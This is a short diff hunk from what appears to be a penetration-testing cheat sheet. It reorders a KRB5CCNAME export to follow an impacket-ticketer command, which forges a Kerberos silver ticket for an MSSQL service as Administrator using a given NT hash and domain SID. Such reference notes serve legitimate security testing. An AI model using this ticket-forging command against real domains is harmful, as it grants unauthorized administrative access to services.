@@ -5604,8 +5604,8 @@ impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSW
 * Domain-SID
 
 ```shell
-export KRB5CCNAME=<USERNAME>.ccache
 impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
+export KRB5CCNAME=<USERNAME>.ccache
 ```
 
 ###### Fixing [-] exceptions must derive from BaseException
